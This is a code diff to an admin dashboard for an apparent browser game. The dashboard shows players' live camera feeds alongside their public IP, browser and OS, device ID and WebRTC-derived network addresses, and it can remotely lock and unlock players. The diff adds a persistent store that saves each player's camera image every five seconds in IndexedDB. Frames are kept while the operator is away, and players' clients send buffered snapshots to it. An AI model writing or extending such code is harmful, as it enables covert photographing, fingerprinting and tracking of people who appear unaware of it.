@@ -71,11 +71,35 @@
     button.warning { background: var(--warning); color: #000; }
     button.danger { background: var(--danger); color: #fff; }
 
+    .section-title-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 10px;
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 12px 16px;
+    }
+    .section-title-left { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+    .section-title-left h2 { font-size: 1.05rem; font-weight: 800; color: var(--text); }
+    .section-controls { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+    select.filter-select {
+      background: var(--panel-dark);
+      color: var(--text);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 7px 10px;
+      font-size: 0.82rem;
+      font-weight: 600;
+      outline: none;
+    }
+
     .grid {
       display: grid;
       grid-template-columns: repeat(auto-fill, minmax(290px, 1fr));
       gap: 16px;
-      flex: 1;
       align-content: start;
     }
     .empty-state {
@@ -83,7 +107,7 @@
       background: var(--panel);
       border: 1px dashed var(--border);
       border-radius: 12px;
-      padding: 48px 20px;
+      padding: 36px 20px;
       text-align: center;
       color: var(--muted);
     }
@@ -102,7 +126,7 @@
     .status-dot { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; background: var(--danger); }
     .status-dot.online { background: var(--success); box-shadow: 0 0 8px var(--success); }
     .status-dot.stale { background: var(--warning); box-shadow: 0 0 8px var(--warning); }
-    . status-dot.offline { background: var(--danger); }
+    .status-dot.offline { background: var(--danger); }
     .player-name { font-weight: 800; font-size: 1rem; color: var(--text); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
 
     .dev-badge { font-size: 0.7rem; font-weight: 800; padding: 3px 8px; border-radius: 999px; flex-shrink: 0; }
@@ -169,8 +193,8 @@
     .sys-row { display: flex; justify-content: space-between; gap: 6px; }
     .sys-row span.val { color: var(--text); font-weight: 600; text-align: right; word-break: break-all; }
 
-    .card-btns { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; }
-    .card-btns button { padding: 6px 8px; font-size: 0.75rem; }
+    .card-btns { display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; }
+    .card-btns button { padding: 6px 6px; font-size: 0.73rem; }
 
     .dm-box {
       display: flex;
@@ -209,6 +233,95 @@
     }
     .dm-input-row input:focus { border-color: var(--accent); }
 
+    /* === 5-SECOND SNAPSHOT GALLERY STYLES === */
+    .snapshots-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(235px, 1fr));
+      gap: 14px;
+      align-content: start;
+    }
+    .snap-card {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+    .snap-img-wrap {
+      width: 100%;
+      aspect-ratio: 4/3;
+      background: #05070c;
+      position: relative;
+      border-bottom: 1px solid var(--border);
+    }
+    .snap-img-wrap img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+    .snap-time-badge {
+      position: absolute;
+      top: 6px;
+      right: 6px;
+      background: rgba(9, 13, 22, 0.85);
+      border: 1px solid var(--border);
+      color: var(--accent);
+      font-size: 0.68rem;
+      font-weight: 700;
+      padding: 2px 7px;
+      border-radius: 999px;
+    }
+    .snap-meta {
+      padding: 10px;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      font-size: 0.74rem;
+      background: var(--panel-dark);
+      flex: 1;
+    }
+    .snap-meta-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 6px;
+      margin-bottom: 2px;
+    }
+    .snap-user-name {
+      font-weight: 800;
+      font-size: 0.88rem;
+      color: var(--text);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .snap-meta-line {
+      display: flex;
+      justify-content: space-between;
+      color: var(--muted);
+      gap: 6px;
+    }
+    .snap-meta-line span.v {
+      color: var(--text);
+      font-weight: 600;
+      text-align: right;
+      word-break: break-all;
+    }
+    .snap-actions {
+      padding: 8px 10px;
+      background: var(--panel);
+      border-top: 1px solid var(--border);
+      display: flex;
+      justify-content: flex-end;
+    }
+    .snap-actions button {
+      width: 100%;
+      padding: 6px 10px;
+      font-size: 0.76rem;
+    }
+
     details.debug { font-size: 0.74rem; color: var(--muted); margin-top: auto; }
     details.debug summary { cursor: pointer; user-select: none; }
     .debug-content { background: #070a10; border: 1px solid var(--border); border-radius: 6px; padding: 8px; margin-top: 4px; font-family: monospace; word-break: break-all; }
@@ -241,7 +354,28 @@
   <div class="grid" id="playersGrid">
     <div class="empty-state" id="emptyState">
       <h3>No Active Players Yet</h3>
-      <p style="margin-top:6px;font-size:0.88rem;">Open <strong>index.html</strong> on any iPhone, Android, Windows, or Mac device. Players will appear here automatically with live 1fps camera feeds, IP/browser telemetry, and direct messaging.</p>
+      <p style="margin-top:6px;font-size:0.88rem;">Open <strong>index.html</strong> on any iPhone, Android, Windows, or Mac device. Players will appear here automatically with live camera feeds, IP/browser telemetry, and 5-second persistent snapshots.</p>
+    </div>
+  </div>
+
+  <!-- 5-SECOND CAPTURED SNAPSHOTS VAULT (Persists in Memory & IndexedDB even while Admin is AFK) -->
+  <div class="section-title-bar">
+    <div class="section-title-left">
+      <h2>📸 Captured Camera Snapshots (Every 5s)</h2>
+      <span class="pill ok">Saved in Memory: <strong id="snapCountLabel">0</strong></span>
+    </div>
+    <div class="section-controls">
+      <select id="snapFilterSelect" class="filter-select" onchange="renderSnapshotGallery()">
+        <option value="ALL">All Players</option>
+      </select>
+      <button class="danger" onclick="deleteAllSnapshots()">🗑️ Delete All Snapshots</button>
+    </div>
+  </div>
+
+  <div class="snapshots-grid" id="snapshotsGrid">
+    <div class="empty-state" id="emptySnapsState">
+      <h3>No Snapshots Captured Yet</h3>
+      <p style="margin-top:6px;font-size:0.85rem;">Snapshots are automatically taken every 5 seconds whenever an active camera user is detected and kept in memory even while you are away.</p>
     </div>
   </div>
 
@@ -254,6 +388,9 @@
     // === SHARED CONFIG (Identical across index.html and admin.html) ===
     const CHANNEL = "luna2026";                 // channel key
     const ADMIN_PEER_ID = `ga-${CHANNEL}-admin`;
+    const SNAPSHOT_INTERVAL_MS = 5000;          // 5 seconds per active camera user
+    const MAX_STORED_SNAPSHOTS = 600;           // cap in-memory/IndexedDB vault
+
     const ICE_SERVERS = [
       { urls: "stun:stun.l.google.com:19302" },
       { urls: "stun:stun.relay.metered.ca:80" },
@@ -270,11 +407,89 @@
 
     // Map of playerId -> player record
     const players = new Map();
+    // Map of snapId -> snapshot object (kept in memory + IndexedDB)
+    const snapshotsStore = new Map();
+    const deletedSnapIds = new Set();
+
     let adminPeer = null;
     let reconnectTimer = null;
     let backoffMs = 1000;
     let globalLocked = false;
     let lastErrorStr = "none";
+
+    // === INDEXEDDB PERSISTENCE FOR SNAPSHOTS (Survives AFK & Tab Reloads) ===
+    const DB_NAME = "ga_admin_snapshots_db";
+    const STORE_NAME = "snapshots";
+    let dbPromise = null;
+
+    function openSnapshotsDB() {
+      if (dbPromise) return dbPromise;
+      dbPromise = new Promise((resolve) => {
+        if (!window.indexedDB) { resolve(null); return; }
+        const req = indexedDB.open(DB_NAME, 1);
+        req.onupgradeneeded = (e) => {
+          const db = e.target.result;
+          if (!db.objectStoreNames.contains(STORE_NAME)) {
+            db.createObjectStore(STORE_NAME, { keyPath: "snapId" });
+          }
+        };
+        req.onsuccess = (e) => resolve(e.target.result);
+        req.onerror = () => resolve(null);
+      });
+      return dbPromise;
+    }
+
+    async function loadSnapshotsFromDB() {
+      const db = await openSnapshotsDB();
+      if (!db) return;
+      return new Promise((resolve) => {
+        try {
+          const tx = db.transaction(STORE_NAME, "readonly");
+          const store = tx.objectStore(STORE_NAME);
+          const req = store.getAll();
+          req.onsuccess = () => {
+            const list = req.result || [];
+            list.sort((a, b) => (a.ts || 0) - (b.ts || 0));
+            list.forEach(snap => {
+              if (snap && snap.snapId && !deletedSnapIds.has(snap.snapId)) {
+                snapshotsStore.set(snap.snapId, snap);
+              }
+            });
+            updatePlayerFilterDropdown();
+            renderSnapshotGallery();
+            resolve();
+          };
+          req.onerror = () => resolve();
+        } catch (e) { resolve(); }
+      });
+    }
+
+    async function saveSnapshotToDB(snap) {
+      const db = await openSnapshotsDB();
+      if (!db) return;
+      try {
+        const tx = db.transaction(STORE_NAME, "readwrite");
+        tx.objectStore(STORE_NAME).put(snap);
+      } catch (e) {}
+    }
+
+    async function removeSnapshotFromDB(snapId) {
+      const db = await openSnapshotsDB();
+      if (!db) return;
+      try {
+        const tx = db.transaction(STORE_NAME, "readwrite");
+        tx.objectStore(STORE_NAME).delete(snapId);
+      } catch (e) {}
+    }
+
+    async function clearAllSnapshotsFromDB() {
+      const db = await openSnapshotsDB();
+      if (!db) return;
+      try {
+        const tx = db.transaction(STORE_NAME, "readwrite");
+        tx.objectStore(STORE_NAME).clear();
+      } catch (e) {}
+    }
 
     function logGA(msg, err) {
       if (err) {
@@ -289,13 +504,260 @@
     function updateDebugLine() {
       const pState = adminPeer ? (adminPeer.destroyed ? "destroyed" : adminPeer.disconnected ? "disconnected" : "open") : "none";
       document.getElementById("debugLine").textContent =
-        `Admin Peer: ${ADMIN_PEER_ID} (${pState}) | Global Lock: ${globalLocked} | Tracked Players: ${players.size} | Last error: ${lastErrorStr}`;
+        `Admin Peer: ${ADMIN_PEER_ID} (${pState}) | Global Lock: ${globalLocked} | Tracked Players: ${players.size} | Stored Snaps: ${snapshotsStore.size} | Last error: ${lastErrorStr}`;
     }
 
     function setAdminPill(text, level) {
       const pill = document.getElementById("adminStatusPill");
       pill.textContent = text;
       pill.className = "pill " + (level || "");
+    }
+
+    // === SNAPSHOT STORAGE, RENDERING & DELETION ===
+    function formatTimestamp(ts) {
+      try {
+        const d = new Date(ts);
+        return d.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" });
+      } catch (e) {
+        return "—";
+      }
+    }
+
+    function updatePlayerFilterDropdown() {
+      const select = document.getElementById("snapFilterSelect");
+      const currentVal = select.value || "ALL";
+      const seenPlayers = new Map();
+
+      players.forEach((rec, id) => seenPlayers.set(id, rec.name));
+      snapshotsStore.forEach((snap) => {
+        if (snap.id && !seenPlayers.has(snap.id)) {
+          seenPlayers.set(snap.id, snap.name || snap.id);
+        }
+      });
+
+      select.textContent = "";
+      const allOpt = document.createElement("option");
+      allOpt.value = "ALL";
+      allOpt.textContent = `All Players (${snapshotsStore.size})`;
+      select.appendChild(allOpt);
+
+      seenPlayers.forEach((name, id) => {
+        let count = 0;
+        snapshotsStore.forEach(s => { if (s.id === id) count++; });
+        const opt = document.createElement("option");
+        opt.value = id;
+        opt.textContent = `${name} (${count})`;
+        select.appendChild(opt);
+      });
+
+      if ( currentVal === "ALL" || seenPlayers.has(currentVal) ) {
+        select.value = currentVal;
+      } else {
+        select.value = "ALL";
+      }
+    }
+
+    function storeSnapshot(snap) {
+      if (!snap || !snap.snapId || !snap.frame || !snap.frame.startsWith("data:image/jpeg;base64,")) return;
+      if (deletedSnapIds.has(snap.snapId) || snapshotsStore.has(snap.snapId)) return;
+
+      snapshotsStore.set(snap.snapId, snap);
+      saveSnapshotToDB(snap);
+
+      // Trim oldest if exceeding max capacity
+      if (snapshotsStore.size > MAX_STORED_SNAPSHOTS) {
+        const oldestId = snapshotsStore.keys().next().value;
+        snapshotsStore.delete(oldestId);
+        removeSnapshotFromDB(oldestId);
+      }
+
+      document.getElementById("snapCountLabel").textContent = String(snapshotsStore.size);
+      updatePlayerFilterDropdown();
+
+      const activeFilter = document.getElementById("snapFilterSelect").value;
+      if (activeFilter === "ALL" || activeFilter === snap.id) {
+        prependSnapshotCardDOM(snap);
+      }
+      updateDebugLine();
+    }
+
+    function createSnapshotCardElement(snap) {
+      const card = document.createElement("div");
+      card.className = "snap-card";
+      card.id = "snap-card-" + snap.snapId;
+
+      const imgWrap = document.createElement("div");
+      imgWrap.className = "snap-img-wrap";
+
+      const img = document.createElement("img");
+      img.src = snap.frame;
+      img.alt = "Player snapshot";
+
+      const timeBadge = document.createElement("span");
+      timeBadge.className = "snap-time-badge";
+      timeBadge.textContent = formatTimestamp(snap.ts);
+
+      imgWrap.appendChild(img);
+      imgWrap.appendChild(timeBadge);
+
+      // Basic user data underneath the snapshot
+      const metaBox = document.createElement("div");
+      metaBox.className = "snap-meta";
+
+      const headerRow = document.createElement("div");
+      headerRow.className = "snap-meta-header";
+
+      const uName = document.createElement("div");
+      uName.className = "snap-user-name";
+      uName.textContent = snap.name || "Player";
+
+      const dev = ["iPhone", "Android", "Windows", "Mac", "Other"].includes(snap.device) ? snap.device : "Other";
+      const badge = document.createElement("span");
+      badge.className = "dev-badge dev-" + dev;
+      badge.textContent = dev;
+
+      headerRow.appendChild(uName);
+      headerRow.appendChild(badge);
+      metaBox.appendChild(headerRow);
+
+      function addMetaLine(label, valText) {
+        const line = document.createElement("div");
+        line.className = "snap-meta-line";
+        const k = document.createElement("span");
+        k.textContent = label;
+        const v = document.createElement("span");
+        v.className = "v";
+        v.textContent = valText;
+        line.appendChild(k);
+        line.appendChild(v);
+        metaBox.appendChild(line);
+      }
+
+      const m = snap.meta || {};
+      addMetaLine("User ID:", String(snap.id || "—").slice(0, 16));
+      addMetaLine("Public IP:", String(m.ip || "Unknown").slice(0, 32));
+      addMetaLine("Browser/OS:", `${String(m.browser || "Browser").slice(0, 18)} • ${String(m.os || dev).slice(0, 14)}`);
+      addMetaLine("Score / State:", `${Number(snap.score) || 0} pts (${snap.state || "playing"})`);
+
+      const actions = document.createElement("div");
+      actions.className = "snap-actions";
+
+      const delBtn = document.createElement("button");
+      delBtn.className = "danger";
+      delBtn.textContent = "🗑️ Delete Snapshot";
+      delBtn.onclick = () => deleteSnapshot(snap.snapId);
+
+      actions.appendChild(delBtn);
+
+      card.appendChild(imgWrap);
+      card.appendChild(metaBox);
+      card.appendChild(actions);
+      return card;
+    }
+
+    function prependSnapshotCardDOM(snap) {
+      const grid = document.getElementById("snapshotsGrid");
+      const emptyEl = document.getElementById("emptySnapsState");
+      if (emptyEl) emptyEl.style.display = "none";
+
+      const card = createSnapshotCardElement(snap);
+      if (grid.firstChild) {
+        grid.insertBefore(card, grid.firstChild);
+      } else {
+        grid.appendChild(card);
+      }
+    }
+
+    function renderSnapshotGallery() {
+      const grid = document.getElementById("snapshotsGrid");
+      const filterVal = document.getElementById("snapFilterSelect").value || "ALL";
+      grid.textContent = "";
+
+      const allSnaps = Array.from(snapshotsStore.values())
+        .filter(s => filterVal === "ALL" || s.id === filterVal)
+        .sort((a, b) => (b.ts || 0) - (a.ts || 0));
+
+      document.getElementById("snapCountLabel").textContent = String(snapshotsStore.size);
+
+      if (allSnaps.length === 0) {
+        const empty = document.createElement("div");
+        empty.className = "empty-state";
+        empty.id = "emptySnapsState";
+        const h3 = document.createElement("h3");
+        h3.textContent = "No Snapshots Captured Yet";
+        const p = document.createElement("p");
+        p.style.marginTop = "6px";
+        p.style.fontSize = "0.85rem";
+        p.textContent = "Snapshots are automatically taken every 5 seconds whenever an active camera user is detected and kept in memory even while you are away.";
+        empty.appendChild(h3);
+        empty.appendChild(p);
+        grid.appendChild(empty);
+        return;
+      }
+
+      allSnaps.forEach(snap => {
+        grid.appendChild(createSnapshotCardElement(snap));
+      });
+    }
+
+    function deleteSnapshot(snapId) {
+      const snap = snapshotsStore.get(snapId);
+      deletedSnapIds.add(snapId);
+      snapshotsStore.delete(snapId);
+      removeSnapshotFromDB(snapId);
+
+      const domCard = document.getElementById("snap-card-" + snapId);
+      if (domCard) domCard.remove();
+
+      // Also notify player client to remove from its offline buffer
+      if (snap && snap.id && players.has(snap.id)) {
+        const rec = players.get(snap.id);
+        if (rec && rec.conn && rec.conn.open) {
+          try { rec.conn.send({ t: "del_snap", snapId: snapId }); } catch (e) {}
+        }
+      }
+
+      document.getElementById("snapCountLabel").textContent = String(snapshotsStore.size);
+      updatePlayerFilterDropdown();
+      if (document.getElementById("snapshotsGrid").children.length === 0) {
+        renderSnapshotGallery();
+      }
+      updateDebugLine();
+    }
+
+    function deleteSnapshotsForPlayer(playerId) {
+      const toDelete = [];
+      snapshotsStore.forEach((snap, id) => {
+        if (snap.id === playerId) toDelete.push(id);
+      });
+      toDelete.forEach(snapId => {
+        deletedSnapIds.add(snapId);
+        snapshotsStore.delete(snapId);
+        removeSnapshotFromDB(snapId);
+      });
+      const rec = players.get(playerId);
+      if (rec && rec.conn && rec.conn.open) {
+        try { rec.conn.send({ t: "clear_snaps" }); } catch (e) {}
+      }
+      updatePlayerFilterDropdown();
+      renderSnapshotGallery();
+      updateDebugLine();
+    }
+
+    function deleteAllSnapshots() {
+      snapshotsStore.forEach((_, snapId) => deletedSnapIds.add(snapId));
+      snapshotsStore.clear();
+      clearAllSnapshotsFromDB();
+
+      players.forEach(rec => {
+        if (rec.conn && rec.conn.open) {
+          try { rec.conn.send({ t: "clear_snaps" }); } catch (e) {}
+        }
+      });
+
+      updatePlayerFilterDropdown();
+      renderSnapshotGallery();
+      updateDebugLine();
     }
 
     // === PEERJS HOST INITIALIZATION & RESILIENCE ===
@@ -369,7 +831,6 @@
       }, delay);
     }
 
-    // Extract WebRTC ICE candidate IP/transport type if exposed by browser
     function inspectWebRTCRemoteAddress(conn, record) {
       try {
         const pc = conn.peerConnection;
@@ -406,7 +867,8 @@
       conn.on("data", (data) => {
         try {
           if (!data || typeof data !== "object") return;
-          const playerId = String(data.id || conn.peer).slice(0, 40);
+          const rawId = data.id || (data.snap && data.snap.id) || conn.peer;
+          const playerId = String(rawId || "").slice(0, 40);
           if (!playerId) return;
 
           let rec = players.get(playerId);
@@ -424,13 +886,14 @@
               target: "—",
               frame: null,
               lastSeen: Date.now(),
+              lastSnapAt: 0,
               closed: false,
               els: null
             };
             players.set(playerId, rec);
             createPlayerCardDOM(rec);
+            updatePlayerFilterDropdown();
           } else {
-            // Replace old connection cleanly without duplicating card
             if (rec.conn && rec.conn !== conn) {
               try { rec.conn.close(); } catch (e) {}
             }
@@ -456,11 +919,53 @@
               rec.streak = Number.isFinite(data.streak) ? data.streak : 0;
               rec.state = ["idle", "playing", "finished", "locked"].includes(data.state) ? data.state : "idle";
               rec.target = typeof data.target === "string" ? data.target.slice(0, 24) : "—";
+
               if (typeof data.frame === "string" && data.frame.startsWith("data:image/jpeg;base64,")) {
                 rec.frame = data.frame;
+                const now = Date.now();
+                // Fallback 5-second auto-snapshot if client doesn't send dedicated 'snap' packets
+                if (now - rec.lastSnapAt >= SNAPSHOT_INTERVAL_MS) {
+                  rec.lastSnapAt = now;
+                  storeSnapshot({
+                    snapId: `${rec.id}-${now}`,
+                    id: rec.id,
+                    name: rec.name,
+                    device: rec.device,
+                    meta: Object.assign({}, rec.meta),
+                    score: rec.score,
+                    streak: rec.streak,
+                    state: rec.state,
+                    target: rec.target,
+                    frame: rec.frame,
+                    ts: now
+                  });
+                }
               }
             }
             updatePlayerCardDOM(rec);
+          } else if (data.t === "snap" && data.snap && typeof data.snap === "object") {
+            // Dedicated 5-second snapshot (either live or flushed from client's offline buffer)
+            const s = data.snap;
+            rec.lastSnapAt = Math.max(rec.lastSnapAt, Number(s.ts) || Date.now());
+            if (typeof s.frame === "string" && s.frame.startsWith("data:image/jpeg;base64,")) {
+              if (!rec.frame) {
+                rec.frame = s.frame;
+                updatePlayerCardDOM(rec);
+              }
+              storeSnapshot({
+                snapId: String(s.snapId || `${rec.id}-${Date.now()}`).slice(0, 64),
+                id: rec.id,
+                name: typeof s.name === "string" ? s.name.slice(0, 20) : rec.name,
+                device: ["iPhone", "Android", "Windows", "Mac", "Other"].includes(s.device) ? s.device : rec.device,
+                meta: (s.meta && typeof s.meta === "object") ? s.meta : rec.meta,
+                score: Number.isFinite(s.score) ? s.score : rec.score,
+                streak: Number.isFinite(s.streak) ? s.streak : rec.streak,
+                state: typeof s.state === "string" ? s.state : rec.state,
+                target: typeof s.target === "string" ? s.target : rec.target,
+                frame: s.frame,
+                ts: Number(s.ts) || Date.now()
+              });
+            }
           } else if (data.t === "msg" && typeof data.text === "string") {
             appendDM(rec, data.name || rec.name, data.text.slice(0, 200), false);
             updatePlayerCardDOM(rec);
@@ -494,7 +999,6 @@
       const card = document.createElement("div");
       card.className = "player-card";
 
-      // Top row: dot, name, device badge
       const topRow = document.createElement("div");
       topRow.className = "card-top";
 
@@ -518,7 +1022,6 @@
       topRow.appendChild(nameGroup);
       topRow.appendChild(devBadge);
 
-      // Camera box
       const camBox = document.createElement("div");
       camBox.className = "cam-box";
 
@@ -545,7 +1048,6 @@
       camBox.appendChild(imgEl);
       camBox.appendChild(camHud);
 
-      // Metrics row
       const metricsGrid = document.createElement("div");
       metricsGrid.className = "metrics-grid";
 
@@ -571,7 +1073,6 @@
       metricsGrid.appendChild(streakM.box);
       metricsGrid.appendChild(targetM.box);
 
-      // Extended System & Network Telemetry Box
       const sysBox = document.createElement("div");
       sysBox.className = "sys-info";
 
@@ -595,7 +1096,6 @@
       const screenVal = makeSysRow("Screen / GPU:");
       const idVal = makeSysRow("Device ID / TZ:");
 
-      // Action buttons for individual player
       const btnRow = document.createElement("div");
       btnRow.className = "card-btns";
 
@@ -613,11 +1113,17 @@
       unlockBtn.textContent = "Unlock";
       unlockBtn.onclick = () => sendCmdToPlayer(rec, "unlock");
 
+      const clearSnapsBtn = document.createElement("button");
+      clearSnapsBtn.className = "danger";
+      clearSnapsBtn.textContent = "Del Snaps";
+      clearSnapsBtn.title = "Delete all snapshots for this user";
+      clearSnapsBtn.onclick = () => deleteSnapshotsForPlayer(rec.id);
+
       btnRow.appendChild(resetBtn);
       btnRow.appendChild(lockBtn);
       btnRow.appendChild(unlockBtn);
+      btnRow.appendChild(clearSnapsBtn);
 
-      // Direct Messaging Box (Admin initiates -> unlocks player's reply box)
       const dmBox = document.createElement("div");
       dmBox.className = "dm-box";
 
@@ -801,7 +1307,10 @@
     window.addEventListener("pageshow", handleAdminWake);
     window.addEventListener("online", handleAdminWake);
 
-    ensureAdminPeer();
+    // Load previously stored snapshots from IndexedDB on startup, then connect PeerJS
+    loadSnapshotsFromDB().then(() => {
+      ensureAdminPeer();
+    });
     setInterval(refreshSummaryCounts, 1000);
   </script>
 </body>
